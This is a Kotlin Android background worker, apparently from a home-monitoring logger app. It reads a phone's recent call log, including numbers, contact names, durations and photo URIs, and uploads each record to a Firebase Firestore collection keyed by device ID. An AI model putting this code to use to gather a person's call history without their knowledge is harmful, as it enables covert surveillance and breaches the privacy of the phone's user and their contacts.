package com.mshomeguardian.logger.workers

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.provider.CallLog
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.mshomeguardian.logger.data.AppDatabase
import com.mshomeguardian.logger.data.CallLogEntity
import com.mshomeguardian.logger.utils.DeviceIdentifier
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.util.*

class CallLogWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    private val db = AppDatabase.getInstance(context.applicationContext)
    private val deviceId = DeviceIdentifier.getPersistentDeviceId(context.applicationContext)

    private val firestore: FirebaseFirestore? = try {
        FirebaseFirestore.getInstance()
    } catch (e: Exception) {
        Log.e(TAG, "Failed to initialize Firestore", e)
        null
    }

    companion object {
        private const val TAG = "CallLogWorker"
        private const val SYNC_LIMIT = 50 // Reduced to avoid excessive processing
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        return@withContext try {
            // Check permissions
            if (ContextCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_CALL_LOG
                ) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Missing READ_CALL_LOG permission")
                return@withContext Result.failure()
            }

            // Get last sync time from shared preferences
            val prefs = applicationContext.getSharedPreferences("call_log_sync", Context.MODE_PRIVATE)
            val lastSyncTime = prefs.getLong("last_sync_time", 0)
            val currentTime = System.currentTimeMillis()

            // Sync call logs
            val syncCount = syncCallLogs(lastSyncTime, currentTime)

            // Upload new records to Firestore
            val uploadCount = uploadNewRecords()

            // Update last sync time if successful
            prefs.edit().putLong("last_sync_time", currentTime).apply()

            Log.d(TAG, "Call log sync completed. Synced $syncCount records. Uploaded $uploadCount records.")
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Error syncing call logs", e)
            Result.retry()
        }
    }

    private suspend fun syncCallLogs(lastSyncTime: Long, currentTime: Long): Int {
        val callLogs = mutableListOf<CallLogEntity>()
        var cursor: Cursor? = null

        try {
            // Query call logs since last sync
            val uri = CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE,
                CallLog.Calls.NEW,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.CACHED_PHOTO_URI,
                CallLog.Calls.IS_READ
            )

            // Selection for calls after the last sync time
            val selection = "${CallLog.Calls.DATE} > ?"
            val selectionArgs = arrayOf(lastSyncTime.toString())
            // Remove LIMIT from sortOrder and use a different approach
            val sortOrder = "${CallLog.Calls.DATE} DESC"

            try {
                cursor = applicationContext.contentResolver.query(
                    uri, projection, selection, selectionArgs, sortOrder
                )
            } catch (e: Exception) {
                Log.e(TAG, "Error in initial query, trying without selection", e)
                // If that fails, try a simpler query
                cursor = applicationContext.contentResolver.query(
                    uri, projection, null, null, sortOrder
                )
            }

            var count = 0
            cursor?.let {
                val idIndex = it.getColumnIndex(CallLog.Calls._ID)
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                val newIndex = it.getColumnIndex(CallLog.Calls.NEW)
                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val photoUriIndex = it.getColumnIndex(CallLog.Calls.CACHED_PHOTO_URI)
                val isReadIndex = it.getColumnIndex(CallLog.Calls.IS_READ)

                while (it.moveToNext() && count < SYNC_LIMIT) {
                    val callId = if (idIndex >= 0) it.getString(idIndex) else UUID.randomUUID().toString()
                    val number = if (numberIndex >= 0 && !it.isNull(numberIndex)) it.getString(numberIndex) ?: "" else ""
                    val date = if (dateIndex >= 0) it.getLong(dateIndex) else currentTime
                    val duration = if (durationIndex >= 0) it.getLong(durationIndex) else 0
                    val type = if (typeIndex >= 0) it.getInt(typeIndex) else CallLog.Calls.MISSED_TYPE
                    val isNew = if (newIndex >= 0) it.getInt(newIndex) == 1 else false
                    val name = if (nameIndex >= 0 && !it.isNull(nameIndex)) it.getString(nameIndex) else null
                    val photoUri = if (photoUriIndex >= 0 && !it.isNull(photoUriIndex)) it.getString(photoUriIndex) else null
                    val isRead = if (isReadIndex >= 0) it.getInt(isReadIndex) == 1 else false

                    // Create call log entity
                    val callLogEntity = CallLogEntity(
                        callId = callId,
                        syncTimestamp = currentTime,
                        phoneNumber = number,
                        timestamp = date,
                        duration = duration,
                        type = type,
                        contactName = name,
                        contactPhotoUri = photoUri,
                        isRead = isRead,
                        isNew = isNew,
                        deletedLocally = false,
                        uploadedToCloud = false,
                        deviceId = deviceId
                    )

                    // For call logs, we'll directly add them to the list instead of checking DB first
                    // This reduces database operations and is more efficient
                    callLogs.add(callLogEntity)
                    count++
                }
            }

            // Insert all new call logs in bulk
            if (callLogs.isNotEmpty()) {
                try {
                    db.callLogDao().insertCallLogs(callLogs)
                    Log.d(TAG, "Inserted ${callLogs.size} new call logs")
                } catch (e: Exception) {
                    // If Room database is having issues, we'll upload directly to Firestore
                    Log.e(TAG, "Error inserting to database, will upload directly to Firestore", e)
                    for (callLog in callLogs) {
                        uploadCallLogDirectly(callLog)
                    }
                }
            }

            return callLogs.size
        } catch (e: Exception) {
            Log.e(TAG, "Error querying call logs", e)
            throw e
        } finally {
            cursor?.close()
        }
    }

    private suspend fun uploadCallLogDirectly(callLog: CallLogEntity) {
        val firestoreInstance = firestore ?: return

        try {
            // Convert CallLogEntity to a Map for Firestore
            val callLogMap = HashMap<String, Any?>()
            callLogMap["callId"] = callLog.callId
            callLogMap["syncTimestamp"] = callLog.syncTimestamp
            callLogMap["phoneNumber"] = callLog.phoneNumber
            callLogMap["timestamp"] = callLog.timestamp
            callLogMap["duration"] = callLog.duration
            callLogMap["type"] = callLog.type
            callLogMap["contactName"] = callLog.contactName ?: ""
            callLogMap["contactPhotoUri"] = callLog.contactPhotoUri ?: ""
            callLogMap["isRead"] = callLog.isRead
            callLogMap["isNew"] = callLog.isNew
            callLogMap["deletedLocally"] = callLog.deletedLocally
            callLogMap["deviceId"] = callLog.deviceId

            // Upload to Firestore
            firestoreInstance.collection("devices")
                .document(deviceId)
                .collection("call_logs")
                .document(callLog.callId)
                .set(callLogMap, SetOptions.merge())
                .await()

            Log.d(TAG, "Call log ${callLog.callId} uploaded directly to Firestore")
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading call log directly ${callLog.callId}: ${e.message}")
        }
    }

    private suspend fun uploadNewRecords(): Int {
        val firestoreInstance = firestore ?: return 0
        var uploadCount = 0

        try {
            // Get call logs that haven't been uploaded
            val notUploadedCallLogs = try {
                db.callLogDao().getNotUploadedCallLogs()
            } catch (e: Exception) {
                Log.e(TAG, "Error getting not uploaded call logs", e)
                emptyList()
            }

            Log.d(TAG, "Found ${notUploadedCallLogs.size} call logs to upload")

            for (callLog in notUploadedCallLogs) {
                try {
                    // Convert CallLogEntity to a Map for Firestore
                    val callLogMap = HashMap<String, Any?>()
                    callLogMap["callId"] = callLog.callId
                    callLogMap["syncTimestamp"] = callLog.syncTimestamp
                    callLogMap["phoneNumber"] = callLog.phoneNumber
                    callLogMap["timestamp"] = callLog.timestamp
                    callLogMap["duration"] = callLog.duration
                    callLogMap["type"] = callLog.type
                    callLogMap["contactName"] = callLog.contactName ?: ""
                    callLogMap["contactPhotoUri"] = callLog.contactPhotoUri ?: ""
                    callLogMap["isRead"] = callLog.isRead
                    callLogMap["isNew"] = callLog.isNew
                    callLogMap["deletedLocally"] = callLog.deletedLocally
                    callLogMap["deviceId"] = callLog.deviceId

                    // Upload to Firestore
                    firestoreInstance.collection("devices")
                        .document(deviceId)
                        .collection("call_logs")
                        .document(callLog.callId)
                        .set(callLogMap, SetOptions.merge())
                        .await()

                    try {
                        // Mark as uploaded
                        val uploadTime = System.currentTimeMillis()
                        db.callLogDao().markCallLogAsUploaded(callLog.id, uploadTime)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error marking call log as uploaded: ${e.message}")
                    }

                    uploadCount++
                    Log.d(TAG, "Call log ${callLog.callId} uploaded successfully")

                } catch (e: Exception) {
                    Log.e(TAG, "Error uploading call log ${callLog.callId}: ${e.message}")
                    // Continue with next record
                }
            }

            return uploadCount
        } catch (e: Exception) {
            Log.e(TAG, "Error in uploadNewRecords", e)
            return 0
        }
    }
}